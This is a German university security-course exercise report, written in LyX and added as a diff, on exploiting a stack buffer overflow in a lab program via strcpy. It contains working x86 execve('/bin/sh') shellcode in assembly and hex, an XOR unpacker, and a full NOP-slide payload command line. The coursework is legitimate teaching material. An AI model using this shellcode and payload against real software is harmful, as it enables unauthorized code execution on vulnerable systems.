@@ -1,0 +1,1087 @@
+#LyX 2.0 created this file. For more info see http://www.lyx.org/
+\lyxformat 413
+\begin_document
+\begin_header
+\textclass scrartcl
+\use_default_options true
+\maintain_unincluded_children false
+\language english
+\language_package default
+\inputencoding auto
+\fontencoding global
+\font_roman default
+\font_sans default
+\font_typewriter default
+\font_default_family default
+\use_non_tex_fonts false
+\font_sc false
+\font_osf false
+\font_sf_scale 100
+\font_tt_scale 100
+
+\graphics default
+\default_output_format default
+\output_sync 0
+\bibtex_command default
+\index_command default
+\paperfontsize default
+\spacing single
+\use_hyperref false
+\papersize default
+\use_geometry true
+\use_amsmath 1
+\use_esint 1
+\use_mhchem 1
+\use_mathdots 1
+\cite_engine basic
+\use_bibtopic false
+\use_indices false
+\paperorientation portrait
+\suppress_date false
+\use_refstyle 1
+\index Index
+\shortcut idx
+\color #008000
+\end_index
+\leftmargin 3cm
+\topmargin 2cm
+\rightmargin 2cm
+\bottommargin 2cm
+\secnumdepth 3
+\tocdepth 3
+\paragraph_separation indent
+\paragraph_indentation default
+\quotes_language english
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\html_math_output 0
+\html_css_as_file 0
+\html_be_strict false
+\end_header
+
+\begin_body
+
+\begin_layout Title
+Rechnersicherheit: Übung 4
+\end_layout
+
+\begin_layout Author
+von 4370074
+\end_layout
+
+\begin_layout Date
+Tutor : Jan-Ole Malchow
+\end_layout
+
+\begin_layout Subsubsection*
+Aufgabe
+\end_layout
+
+\begin_layout Standard
+Aufgabe war es, für den gegebenen C Code 
+\series bold
+stack_victim.c
+\series default
+ einen Exploit zu bauen, der eine Konsole öffnet.
+ Dazu sollte zum einen ein 
+\series bold
+Shellcode
+\series default
+ konstruiert zum anderen ein 
+\series bold
+Unpacker
+\series default
+ geschrieben werden.
+ Der Packer wurde uns dabei gestellt, zusammen mit der Möglichkeit Basepointer,
+ Shellcodelänge und XOR-Maske in den 
+\series bold
+Unpacker
+\series default
+ einzusetzen.
+\end_layout
+
+\begin_layout Subsubsection*
+Überlegung
+\end_layout
+
+\begin_layout Standard
+Der Code, den wir exploiten werden, sieht folgender Maßen aus:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+void copy_string_unsafe(char *s) {
+\end_layout
+
+\begin_layout Plain Layout
+
+  char buf[256];
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+  strcpy(buf, s);
+\end_layout
+
+\begin_layout Plain Layout
+
+  printf("The string is 
+\backslash
+"%s
+\backslash
+"
+\backslash
+n", buf);
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Interessant für uns ist, dass wir eine locale Variable anlegen, die aus
+ einem Array besteht.
+ Wenn wir also 
+\series bold
+strcpy
+\series default
+ aufrufen, wir der Stack folgender Maßen aussehen
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+low                                                 high
+\end_layout
+
+\begin_layout Plain Layout
+
+   [       |   buffer       | ebp   | return  |     ]
+\end_layout
+
+\begin_layout Plain Layout
+
+                256             4       4
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Wir können unseren Shellcode also auf maximal 260 Byte ausdehnen, ohne hinter
+ den Stackpointer zu rutschen.
+ Diese Distanz müssen wir ohnehin komplett Ausnutzen, um die Returnaddresse
+ zu überschreiben.
+ Dies kommt uns gut zu pass, weil wir an den Anfang gerne eine NOP-Slide
+ bauen möchten, um mit einer höheren Wahrscheinlichkeit treffen zu können.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Betrachten wir also als nächstes die beiden Codeteile, die wir schreiben
+ müssen.
+\end_layout
+
+\begin_layout Subsubsection*
+Shellcode
+\end_layout
+
+\begin_layout Standard
+Wie man den Shellcode aufbauen kann, haben wir der VL, dem Tutorium und
+ dem Paper 'Smashing the Stack for FUn and Profit' entnommen.
+\end_layout
+
+\begin_layout Standard
+Betrachten wir erst einmal das Programm, das wir ausführen wollen in leicht
+ verständichem C Code.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+void openShell(){
+\end_layout
+
+\begin_layout Plain Layout
+
+	char *env[2];
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	env[0] = "/bin/sh";
+\end_layout
+
+\begin_layout Plain Layout
+
+	env[1] = NULL;
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	execve(name[0],name, NULL);
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Um den Befehl 
+\series bold
+execve
+\series default
+ auszuführen, müssen wir zum einen den String 
+\emph on
+/bin/sh
+\emph default
+ reingeben.
+ Als nächstes erwartet das Kommando einen Pointer auf eine Liste mit Umgebungsva
+riablen.
+ In unserem Fall reicht es aus, den Befehl nocheinmal anzugeben und die
+ Liste mit einer 
+\emph on
+NULL
+\emph default
+ zu terminieren.
+ Als letztes Kommen noch Parameter hinzu, die an den Aufruf übergeben werden
+ sollen.
+ In unserem Fall keine, also reicht hier ein NULL.
+\end_layout
+
+\begin_layout Standard
+Es bleibt zu erwähnen, das es in unseren ersten Versuchen gereicht hat 
+\emph on
+execve(
+\begin_inset Quotes eld
+\end_inset
+
+/bin/sh
+\begin_inset Quotes erd
+\end_inset
+
+,NULL,NULL)
+\emph default
+ zu benutzen.
+ Da es aber überall so als Standard angegeben war, haben wir uns auch für
+ diese Variante entschieden.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Nun können wir ein Problem bekommen unsere Liste zu bekommen, da wir die
+ absoluten Addressen nicht zwangsläufig kennen und so also keinen Pointer
+ auf diese Liste bekommen.
+ Deswegen bedienen wir uns eines Tricks, den wir im Tutorium gesehen haben
+ und im Paper nachgelesen haben.
+\end_layout
+
+\begin_layout Standard
+Wir führen am Anfang einen Jump aus, an dem wir einen String auf den Stack
+ legen.
+ Davor springen wir mittels eines 
+\series bold
+call
+\series default
+ dein Code an, der das 
+\emph on
+execve 
+\emph default
+aufruft.
+ Dies bringt uns den Luxus, dass für diesen Aufruf ein neuer Stackframe
+ angelegt wird.
+ Da die Returnaddresse dieses Abschnitts auf den nächsten Codeabschnitt
+ zeigt, der in unserem Fall unser String und unsere Liste ist, haben wir
+ hier einen Pointer darauf, den wir ziemlich leicht erreichen.
+\end_layout
+
+\begin_layout Standard
+Mit Hilfe dieser Pointer können wir nun einen Interrupt auslösen, der 
+\emph on
+execve
+\emph default
+ aufruft.
+ Der folgende Code ist schon NULLByte frei gehalten, da wir den Code ersteinmal
+ einzeln testen wollten.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+jmp    0x1f                    
+\end_layout
+
+\begin_layout Plain Layout
+
+popl   %esi                // Holt den Pointer auf den String vom Stack
+ <---|   
+\end_layout
+
+\begin_layout Plain Layout
+
+movl   %esi,0x8(%esi)                                                  
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+xorl   %eax,%eax           //Erzeugt uns ein NULLByte                  
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+movb   %eax,0x7(%esi)      //Terminiert unseren String mit '
+\backslash
+0'             |
+\end_layout
+
+\begin_layout Plain Layout
+
+movl   %eax,0xc(%esi)      //Fügt das NULL als 2.
+ in die Liste ein          |
+\end_layout
+
+\begin_layout Plain Layout
+
+movl   $0xb,%al            //Schreibt in den unteren Bereich von eax   
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+movl   %esi,%ebx           //Lädt den String ins 2 Register (Aufruf)   
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+leal   0x8(%esi),%ecx      //Addresse von /bin/sh (env[0])  				|
+\end_layout
+
+\begin_layout Plain Layout
+
+leal   0xc(%esi),%edx      //Addresse von NULL (env[1]) 					|
+\end_layout
+
+\begin_layout Plain Layout
+
+int    $0x80                                                           
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+xorl   %ebx,%ebx          //Erzeugt ein NULLByte							|
+\end_layout
+
+\begin_layout Plain Layout
+
+movl   %ebx,%eax          //Lädt es in eax  								|
+\end_layout
+
+\begin_layout Plain Layout
+
+inc    %eax               //Setzt eay auf 1 								|
+\end_layout
+
+\begin_layout Plain Layout
+
+int    $0x80              //Ruft execve auf                            
+     |
+\end_layout
+
+\begin_layout Plain Layout
+
+call   -0x24              // Hier kommt der erste Jump an und spingt-------
+\end_layout
+
+\begin_layout Plain Layout
+
+//Hier kommt /bin/sh
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Wir sehen am Anfang den beschriebenen Jump, der relativ 0x1f Bytes nach
+ vorne geht (in Byte representation nachgezählt).
+ Gleich an dem Jump rufen wir per call eine Addresse relativ hinter uns
+ auf (Im Bild eingezeichnet).
+ Der Returnpointer zeigt nun auf den String, der danach steht.
+ Wir können ihn einfach mit pop vom Stack holen und speichern ihn in %esi,
+ was ein spezialregister für String Operationen ist.
+ Danach schreiben wir ein Terminierendes Nullbyte ans Ende und die Null
+ ins Array dahinter.
+ Danach sortieren wir noch unsere Register für den Aufruf und werfen den
+ Interrupt.
+ Dieser wird nun die Register auslesen und den Befehl ausführen.
+\end_layout
+
+\begin_layout Standard
+Das günstige für uns.
+ Nach execve kehrt das Programm nicht zum ursprünglichen Verlauf zurück,
+ wodurch der kaputte Stackframe nicht auffällt.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Dieses Programm können wir nun als inline Assambler in C schreiben und mit
+ gcc kompilieren.
+ Wir erhalten nach umschreiben, damit man es einfach rein pipen kann:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+xeb
+\backslash
+x1f
+\backslash
+x5e
+\backslash
+x89
+\backslash
+x76
+\backslash
+x08
+\backslash
+x31
+\backslash
+xc0
+\backslash
+x88
+\backslash
+x46
+\backslash
+x07
+\backslash
+x89
+\backslash
+x46
+\backslash
+x0c
+\backslash
+xb0
+\backslash
+x0b
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+x89
+\backslash
+xf3
+\backslash
+x8d
+\backslash
+x4e
+\backslash
+x08
+\backslash
+x8d
+\backslash
+x56
+\backslash
+x0c
+\backslash
+xcd
+\backslash
+x80
+\backslash
+x31
+\backslash
+xdb
+\backslash
+x89
+\backslash
+xd8
+\backslash
+x40
+\backslash
+xcd
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+x80
+\backslash
+xe8
+\backslash
+xdc
+\backslash
+xff
+\backslash
+xff
+\backslash
+xff/bin/sh
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Den Befehl /bin/sh können wir einfach im Klartext dahinter schreiben, da
+ dieser dann als String einfach auf dem Stack steht, so wie wir ihn brauchen.
+\begin_inset VSpace defskip
+\end_inset
+
+Da dieser Code bereits Nullbyte frei ist, haben wir diesen ersteinmal getestet.
+ Die Durchführung beschreiben wir im gleichnamigen Abschnitt.
+\end_layout
+
+\begin_layout Subsubsection*
+(Un)Packer
+\end_layout
+
+\begin_layout Standard
+Um den Unpacker zu bauen, müssen wir zuerst verstehen, wie der Packer funktionie
+rt.
+ In der Grundfunktionalität den Shellcode von Nullbytes zu befreien, wir
+ dieser nach dem ersten Wert durchsucht, der nicht im Code vorkommt.
+ Ist dies gefunden (vorrausgesetzt es ist vorhanden, sonst funktioniert
+ es gar nicht) wird der gesammte Code mit diesem Byte geXORt.
+ Da dieses Byte nicht im Code vorkommt, wird danach keine Null mehr drin
+ stehen.
+\end_layout
+
+\begin_layout Standard
+Der Packer gibt uns nun auch noch die Funktionalität, die XOR Maske in den
+ Unpacker zu kopieren und uns die Länge des Shellcodes zu geben.
+\end_layout
+
+\begin_layout Standard
+Diese 2 Werte genügen uns um den Code wieder in die von uns gewünscht ausführbar
+e Variante zu übersetzen.
+ Der Assamblercode dazu sieht folgender Maßen aus:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+movl	$xor,%edx    //Hier wird die Maske reinkopiert
+\end_layout
+
+\begin_layout Plain Layout
+
+movl    %eip,%ecx    //Wir holen uns die aktuelle Stelle im Code
+\end_layout
+
+\begin_layout Plain Layout
+
+add	 $0x2f,%ecx   //Addiert den restlichen offset vom Code darauf
+\end_layout
+
+\begin_layout Plain Layout
+
+movl	%ecx,%ebx	// Sichern, mit bx gehen wir über den Code
+\end_layout
+
+\begin_layout Plain Layout
+
+add	 $len,%ecx	// Wir addieren die Länge auf die Zahl => Ende des Codes
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+//Anlegen der Variablen fertig
+\end_layout
+
+\begin_layout Plain Layout
+
+xorl    %edx,*(%ebx)  //XOR der Maske an der Stelle auf die ebx zeigt
+\end_layout
+
+\begin_layout Plain Layout
+
+inc	 %ebx
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+cmp     %ebx,%ecx	 // Wenn wir am Ende des Shellcodes sind		
+\end_layout
+
+\begin_layout Plain Layout
+
+jnz	 -0x12       //Springt an den Ende des Code
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+nop
+\end_layout
+
+\begin_layout Plain Layout
+
+nop				 //Ein paar NOPs weil ich mir bei zählen nicht so sicher war
+\end_layout
+
+\begin_layout Plain Layout
+
+nop
+\end_layout
+
+\begin_layout Plain Layout
+
+nop
+\end_layout
+
+\begin_layout Plain Layout
+
+nop
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Der erste Teil des Codes kümmert sich nur darum alle Werte die man braucht
+ in Register zu laden.
+ Ich benötige zum einen die Maske, einen aktuellen Pointer und das ende
+ des codes.
+ Prinzipiell würde es in C etwa so aussehen:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single,tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+int d = 0xab;		//Beliebige Maske an dieser Stelle
+\end_layout
+
+\begin_layout Plain Layout
+
+int c = strln(buffer);
+\end_layout
+
+\begin_layout Plain Layout
+
+int b = 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+while(c != b){
+\end_layout
+
+\begin_layout Plain Layout
+
+	buffer[b] = buffer[b] ^ d;
+\end_layout
+
+\begin_layout Plain Layout
+
+	b++;
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Wenn wir das Programm kompilieren konnten wir den Bytecode daraus extrahieren.
+ Ich konnte aber für diese Abgabe den Code nicht wieder generieren, da mein
+ gcc mekert er würde movl nicht mehr kennen.
+\end_layout
+
+\begin_layout Standard
+Wenn wir ihn haben, können wir ihn einfach benutzen und für unserem Code
+ einfügen.
+\begin_inset Newpage pagebreak
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsubsection*
+Durchführung
+\end_layout
+
+\begin_layout Standard
+Nun haben wir alles zusammen, was wir brauchen.
+ Da unser Shellcode an sich Nullbytefrei war, wird das Buildscript den Code
+ gar nicht mehr mit einbauen.
+\end_layout
+
+\begin_layout Standard
+Sonst würde man den Builder aufrufen mit (packer.o ist unser packer in bytes,
+ ebenso exploit.c der exploit [siehe oben]):
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+stack_builder -p packer.o -c exploit.o -2 40 -4 45 -x 1 -l 7 -b 0xffffd358
+ -s 260
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Die Länge konnten wir aus dem Aufbau auslesen (siehe Überlegung).
+ Die Addresse konnte man in gdb leicht herraus finden, indem man ein break
+ auf copy_string_unsafe setzt.
+\end_layout
+
+\begin_layout Standard
+Die anderen Parametern bekommt man auch leicht durch zählen herraus.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Dies war nun unser 2ter Test.
+ Da wir den unpacker nicht benötigt haben, haben wir unseren Shellcode auch
+ einmal selber zusammen gebastelt (Die Addresse ist hier eine andere, da
+ wir auf einer anderen VM getestet hatten)
+\end_layout
+
+\begin_layout Standard
+Der Aufbau sah wie folgt aus:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+gcc -o stack stack_victim.c
+\end_layout
+
+\begin_layout Plain Layout
+
+./stack $(python -c "print 214*'
+\backslash
+x90'+'
+\backslash
+x90
+\backslash
+xeb
+\backslash
+x1f
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+x5e
+\backslash
+x89
+\backslash
+x76
+\backslash
+x08
+\backslash
+x31
+\backslash
+xc0
+\backslash
+x88
+\backslash
+x46
+\backslash
+x07
+\backslash
+x89
+\backslash
+x46
+\backslash
+x0c
+\backslash
+xb0
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+x0b
+\backslash
+x89
+\backslash
+xf3
+\backslash
+x8d
+\backslash
+x4e
+\backslash
+x08
+\backslash
+x8d
+\backslash
+x56
+\backslash
+x0c
+\backslash
+xcd
+\backslash
+x80
+\backslash
+x31
+\backslash
+xdb
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+x89
+\backslash
+xd8
+\backslash
+x40
+\backslash
+xcd
+\backslash
+x80
+\backslash
+xe8
+\backslash
+xdc
+\backslash
+xff
+\backslash
+xff
+\backslash
+xff/bin/sh'+
+\end_layout
+
+\begin_layout Plain Layout
+
+4*'
+\backslash
+xbf
+\backslash
+xf1
+\backslash
+xff
+\backslash
+xbf'")
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Wie man sieht, haben wir vor unseren Code (der selbe wie oben) 215 mal ein
+ NOP als NOPSlide genommen.
+ Nach den Code haben wir 4 mal eine Addresse angegeben, die in etwa in der
+ Mitte der NOPs liegen sollte.
+ Die Berechnungsformel haben wir dem stack_builder.c entnommen.
+\end_layout
+
+\begin_layout Standard
+Damit lief der exploit so gut, wie mit dem buildscript.
+\end_layout
+
+\begin_layout Subsubsection*
+Auswertung
+\end_layout
+
+\begin_layout Standard
+Folgendes waren die Ausgaben des Buildscriptes:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\footnotesize\ttfamily},frame=single"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+Loaded 40 bytes of packer code.
+\end_layout
+
+\begin_layout Plain Layout
+
+Loaded 45 bytes of shellcode.
+\end_layout
+
+\begin_layout Plain Layout
+
+No string packer is necessary.
+\end_layout
+
+\begin_layout Plain Layout
+
+Using 216 bytes of NOP slide, 0 bytes of packer
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Prinzipiell kommt der selbe Code herraus, den wir bekommen.
+ Der Vorteil an dem Buildscript ist, dass es Nullbytes herrausshifted, wenn
+ diese in der Sprungaddresse vorkommen.
+\end_layout
+
+\begin_layout Standard
+Die Theorie hinter dem Exploit ist nicht sehr schwer zu verstehen gewesen.
+\end_layout
+
+\begin_layout Standard
+Das was Probleme bereit hat, ist das wir am Anfang nicht zurecht kamen,
+ wie man die ganzen Routinen anspringen soll.
+\end_layout
+
+\begin_layout Standard
+Das man in so kurzer Zeit nicht selbst darauf kommen konnte, machte die
+ Aufgabe ziemlich witzlos, weil man den größten Teil wirklich aus dem Script
+ nehmen konnte.
+\end_layout
+
+\begin_layout Standard
+Wenn man den Code ersteinmal hatte, war das Verständnis auch nicht mehr
+ schwer.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Der Umgang mit dem Buildscript war auch nicht sehr intuitiv.
+ Ich hab ewig gebraucht, bis ich verstanden habe, was dort wo hin muss.
+ Nur gut, dass ich durch den Selbstversuch schon wusste, dass es funktioniert.
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Schade war auch, dass man seinen Code nicht einfach in das Programm pipen
+ konnte, sondern immer als Paramter übergeben musste.
+\end_layout
+
+\end_body
+\end_document
